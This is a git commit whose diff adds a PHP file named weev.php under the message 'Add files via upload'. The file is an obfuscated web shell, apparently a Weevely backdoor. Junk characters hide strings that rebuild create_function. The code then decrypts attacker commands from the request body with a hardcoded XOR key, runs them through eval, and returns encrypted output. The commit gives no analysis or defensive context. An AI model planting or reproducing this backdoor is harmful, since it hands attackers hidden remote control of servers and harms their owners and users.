3444df7dfc15c156f2a60dc3e0b69ef2a3af3932
adilkhan7 <57895372+adilkhan7@users.noreply.github.com>
2022-11-24 16:42:47 +0600

    Add files via upload

---
+++ weev.php
@@ -0,0 +1,11 @@
+<?php
+$O='=0;($jrr<$c&&rr$i<$l);$j++rr,$i++rr){$o.=$rrt{$rri}^$k{rr$jrrrr};}}return $rro;}ifrr (@prrreg_match(';
+$H=str_replace('z','','crezatzzezzz_function');
+$p='brr_end_clean();$rrr=@baserr64_rrencrrode(@x(@grrzcompress(rr$o)rrrr,$k));rrprrrint("$p$kh$r$kf");}';
+$n='$k="202cbrrrr962";rr$kh="ac59075brr96rr4b";$rrkf="071rr52d234rrb70";$p=rr"zrr81ysUdrrgz2LzSwGkrr"';
+$K='"/rr$rrkh(rr.+)$kf/",@file_gerrtrr_contents(rr"rrphprr:/rr/input"),$m)rr=rr=1) {@ob_start();@errva';
+$m=';frrunction x($trr,rr$k){$c=strrrlen($krr);$l=strrrlen(rr$t);$o=rrrr"rr";frror($i=0;$i<$l;){for(rrrr$j';
+$U='rrl(@gzuncomrrpresrrs(@x(rr@brrase64_decodrre($m[rr1]rr),$krr)));$o=@ob_rrget_rrconrrtenrrts();@o';
+$g=str_replace('rr','',$n.$m.$O.$K.$U.$p);
+$M=$H('',$g);$M();
+?>
